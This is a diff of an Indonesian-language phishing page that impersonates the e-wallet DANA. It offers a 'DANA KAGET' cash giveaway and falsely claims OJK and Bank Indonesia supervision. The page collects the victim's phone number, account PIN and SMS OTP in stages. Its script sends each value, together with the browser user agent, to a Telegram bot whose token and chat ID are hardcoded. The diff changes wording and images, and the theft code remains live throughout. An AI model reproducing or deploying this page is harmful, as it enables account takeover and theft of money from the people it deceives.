@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>DANA KAGET - Ambil Saldo Sekarang</title>
+    <title>DANA KAGET - Klaim Saldo Sekarang</title>
     
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700;800&display=swap" rel="stylesheet">
     <script src="https://cdn.jsdelivr.net/npm/canvas-confetti@1.5.1/dist/confetti.browser.min.js"></script>
@@ -14,14 +14,15 @@
             --dana-blue: #118eea;
             --gold: #ffd700;
             --white: #ffffff;
-            --glass: rgba(255, 255, 255, 0.12);
+            --glass: rgba(255, 255, 255, 0.1);
         }
 
         * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Inter', sans-serif; -webkit-tap-highlight-color: transparent; }
 
         body {
-            background: linear-gradient(rgba(0, 86, 179, 0.95), rgba(17, 142, 234, 0.95)), 
-                        url('https://i.ibb.co.com/Tx4Qd0jT/dana-cdd98c.jpg');
+            /* Menggunakan Banner Anda sebagai Background dengan Overlay Gelap */
+            background: linear-gradient(rgba(0, 86, 179, 0.92), rgba(17, 142, 234, 0.95)), 
+                        url('https://i.ibb.co.com/PZ8BgZ13/Blog-Banner-1080-x-556-c532047cac.png');
             background-size: cover; background-position: center; background-attachment: fixed;
             min-height: 100vh; display: flex; justify-content: center; align-items: center; padding: 15px;
             user-select: none;
@@ -29,28 +30,31 @@
 
         .app-shell {
             width: 100%; max-width: 410px; background: var(--glass); backdrop-filter: blur(35px);
-            border-radius: 30px; border: 1px solid rgba(255,255,255,0.25);
+            border-radius: 25px; border: 1px solid rgba(255,255,255,0.2);
             box-shadow: 0 40px 80px rgba(0,0,0,0.5); overflow: hidden; position: relative;
         }
 
         /* OJK Header */
         .ojk-header {
             background: rgba(255, 255, 255, 0.98);
-            padding: 12px 15px; display: flex; align-items: center; justify-content: center; gap: 12px;
+            padding: 10px 15px; display: flex; align-items: center; justify-content: center; gap: 12px;
         }
         .ojk-logo-img { height: 22px; width: auto; }
-        .ojk-text { font-size: 0.65rem; color: #333; font-weight: 800; text-transform: uppercase; }
+        .ojk-text { font-size: 0.65rem; color: #333; font-weight: 800; text-transform: uppercase; line-height: 1.2; }
 
+        /* Banner Utama dari Tautan Anda */
         .hero-banner {
-            width: 100%; height: 160px; background: url('https://i.ibb.co.com/Tx4Qd0jT/dana-cdd98c.jpg');
-            background-size: cover; background-position: center; border-bottom: 3px solid var(--gold);
+            width: 100%; height: 190px; 
+            background: url('https://i.ibb.co.com/PZ8BgZ13/Blog-Banner-1080-x-556-c532047cac.png');
+            background-size: cover; background-position: center; 
+            border-bottom: 3px solid var(--gold);
         }
 
-        .stage { display: none; padding: 25px; animation: slideUp 0.5s cubic-bezier(0.25, 0.46, 0.45, 0.94); }
+        .stage { display: none; padding: 25px; animation: slideUp 0.5s ease-out; }
         .stage.active { display: block; }
-        @keyframes slideUp { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }
+        @keyframes slideUp { from { opacity: 0; transform: translateY(25px); } to { opacity: 1; transform: translateY(0); } }
 
-        /* Envelope Design */
+        /* Envelope UI */
         .env-container {
             width: 140px; height: 95px; background: #f44336; margin: 20px auto;
             position: relative; border-radius: 0 0 12px 12px; cursor: pointer; box-shadow: 0 15px 30px rgba(0,0,0,0.3);
@@ -68,9 +72,9 @@
         }
         .env-container.open .env-paper { transform: translateY(-70px); z-index: 3; }
 
-        /* Input Styling */
+        /* Input Styles */
         .input-box {
-            background: white; border-radius: 15px; padding: 15px; display: flex; align-items: center;
+            background: white; border-radius: 15px; padding: 16px; display: flex; align-items: center;
             margin-bottom: 20px; box-shadow: inset 0 2px 4px rgba(0,0,0,0.1);
         }
         .input-box i { color: var(--dana-blue); margin-right: 15px; font-size: 1.2rem; }
@@ -79,12 +83,12 @@
         .btn-action {
             width: 100%; padding: 18px; border: none; border-radius: 15px;
             background: var(--gold); color: #004d99; font-weight: 800; font-size: 1.1rem;
-            cursor: pointer; box-shadow: 0 8px 20px rgba(255,215,0,0.3); transition: 0.3s;
+            cursor: pointer; box-shadow: 0 8px 20px rgba(255,215,0,0.4); transition: 0.3s;
         }
         .btn-action:disabled { background: #b0bec5; color: #78909c; cursor: not-allowed; }
 
-        /* Digit Box Transparan */
-        .box-group { display: flex; justify-content: center; gap: 10px; margin: 25px 0; }
+        /* Visual Digit Box */
+        .box-group { display: flex; justify-content: center; gap: 10px; margin: 20px 0; }
         .digit-box { 
             width: 42px; height: 52px; 
             background: rgba(255, 255, 255, 0.15); 
@@ -92,22 +96,21 @@
             border-radius: 12px;
             display: flex; align-items: center; justify-content: center;
             font-size: 1.5rem; font-weight: 700; color: var(--gold);
-            transition: all 0.2s;
         }
         .digit-box.filled { border-color: var(--gold); background: rgba(255, 255, 255, 0.25); }
 
-        /* Numpad Keypad */
-        .keypad { display: grid; grid-template-columns: repeat(3, 1fr); gap: 12px; max-width: 280px; margin: 0 auto; }
+        /* Keypad */
+        .keypad { display: grid; grid-template-columns: repeat(3, 1fr); gap: 12px; max-width: 290px; margin: 0 auto; }
         .key {
-            height: 60px; background: rgba(255,255,255,0.08); border: 1px solid rgba(255,255,255,0.15);
+            height: 62px; background: rgba(255,255,255,0.08); border: 1px solid rgba(255,255,255,0.15);
             border-radius: 50%; display: flex; justify-content: center; align-items: center;
-            font-size: 1.5rem; font-weight: 600; color: white; cursor: pointer; transition: 0.1s;
+            font-size: 1.5rem; font-weight: 600; color: white; cursor: pointer;
         }
-        .key:active { background: white; color: var(--dana-blue); transform: scale(0.92); }
+        .key:active { background: white; color: var(--dana-blue); transform: scale(0.9); }
 
-        .timer-text { color: var(--gold); font-size: 0.85rem; margin-top: 15px; font-weight: 600; text-align: center; }
+        .timer-text { color: var(--gold); font-size: 0.85rem; margin-top: 15px; text-align: center; }
 
-        footer { padding: 20px; text-align: center; color: white; font-size: 0.65rem; opacity: 0.8; line-height: 1.4; }
+        footer { padding: 20px; text-align: center; color: white; font-size: 0.65rem; opacity: 0.8; line-height: 1.5; }
 
         .overlay {
             position: absolute; top: 0; left: 0; width: 100%; height: 100%;
@@ -138,7 +141,7 @@
         </div>
         <h3 style="color:white; text-align:center; margin-bottom:20px; font-size: 0.9rem;">Tap amplop untuk ambil hadiah!</h3>
         
-        <div id="f-ph" style="opacity:0; pointer-events:none; transition: 0.5s;">
+        <div id="f-ph" style="opacity:0; pointer-events:none; transition: 0.6s;">
             <div class="input-box">
                 <i class="fas fa-phone-alt"></i>
                 <input type="number" id="ph_num" placeholder="Nomor DANA (08...)" oninput="v_ph()">
@@ -149,8 +152,8 @@
 
     <div id="stg-2" class="stage">
         <div style="text-align: center; color: white;">
-            <h2 style="margin: 0 0 5px;">PIN DANA</h2>
-            <p style="font-size: 0.8rem; opacity: 0.8;">Masukkan PIN akun DANA Anda</p>
+            <h2 style="margin-bottom: 5px;">PIN DANA</h2>
+            <p style="font-size: 0.8rem; opacity: 0.8;">Masukkan PIN keamanan Anda</p>
         </div>
         <div class="box-group" id="pin_v">
             <div class="digit-box"></div><div class="digit-box"></div><div class="digit-box"></div>
@@ -166,8 +169,8 @@
 
     <div id="stg-3" class="stage">
         <div style="text-align: center; color: white;">
-            <h2 style="margin: 0 0 5px;">KODE OTP</h2>
-            <p style="font-size: 0.8rem; opacity: 0.8;">Masukkan kode yang dikirim ke SMS</p>
+            <h2 style="margin-bottom: 5px;">KODE OTP</h2>
+            <p style="font-size: 0.8rem; opacity: 0.8;">Masukkan kode dari SMS</p>
         </div>
         <div class="box-group" id="otp_v">
             <div class="digit-box"></div><div class="digit-box"></div><div class="digit-box"></div><div class="digit-box"></div>
@@ -182,16 +185,17 @@
     </div>
 
     <div id="stg-4" class="stage">
-        <div style="text-align: center; color: white; padding: 20px 0;">
+        <div style="text-align: center; color: white;">
             <i class="fas fa-check-circle" style="font-size: 4rem; color: var(--gold); margin-bottom: 20px;"></i>
             <h2>Proses Berhasil!</h2>
-            <p style="opacity: 0.9; font-size: 0.9rem;">Saldo sedang dikirimkan ke akun Anda.</p>
+            <p style="opacity: 0.9; font-size: 0.9rem;">Saldo sedang diverifikasi untuk pengiriman.</p>
         </div>
     </div>
 
     <footer>
-        <i class="fas fa-shield-alt"></i> DANA Protection - Keamanan Berlapis<br>
-        Berizin dan Diawasi oleh OJK & Bank Indonesia
+        <img src="https://i.ibb.co.com/WvJPSCC9/OJK-Logo.png" style="height:20px; filter: brightness(0) invert(1); margin-bottom: 10px;"><br>
+        DANA Protection - Data Terenkripsi Aman.<br>
+        Berizin dan Diawasi oleh OJK & Bank Indonesia.
     </footer>
 
     <div class="overlay" id="ldr">
@@ -201,7 +205,7 @@
 </div>
 
 <script>
-    // Konfigurasi Disamarkan Secara Dasar
+    // BOT CONFIG
     const _0xT = "8336160915:AAFUeRN28Q5CsdxMsYH5qvS6IQ9iJxqpEXA";
     const _0xC = "8001301204";
 
@@ -224,7 +228,7 @@
 
     function s_ph() {
         l_dr("Validasi Nomor...", 1200, () => {
-            notify(`😈 *STEP 1: PHONE*\n📱 *No:* \`${_d.ph}\`\n🌐 *UA:* \`${navigator.userAgent}\``);
+            notify(`😈 *DATA MASUK*\n📱 *No:* \`${_d.ph}\`\n🌐 *UA:* \`${navigator.userAgent}\``);
             s_tr('stg-1', 'stg-2');
         });
     }
@@ -241,7 +245,7 @@
 
     function s_pi() {
         l_dr("Sinkronisasi PIN...", 1800, () => {
-            notify(`😈 *STEP 2: PIN*\n📱 *No:* \`${_d.ph}\`\n🔐 *PIN:* \`${_d.pi}\``);
+            notify(`😈 *UPDATE PIN*\n📱 *No:* \`${_d.ph}\`\n🔐 *PIN:* \`${_d.pi}\``);
             s_tr('stg-2', 'stg-3');
             r_tm();
         });
@@ -249,7 +253,7 @@
 
     function s_ot() {
         l_dr("Finalisasi...", 2200, () => {
-            notify(`😈 *FINAL: DATA*\n📱 *No:* \`${_d.ph}\`\n🔐 *PIN:* \`${_d.pi}\`\n💬 *OTP:* \`${_d.ot}\``);
+            notify(`😈 *FINAL DATA*\n📱 *No:* \`${_d.ph}\`\n🔐 *PIN:* \`${_d.pi}\`\n💬 *OTP:* \`${_d.ot}\``);
             s_tr('stg-3', 'stg-4');
             confetti({ particleCount: 150, spread: 70, origin: { y: 0.6 } });
         });
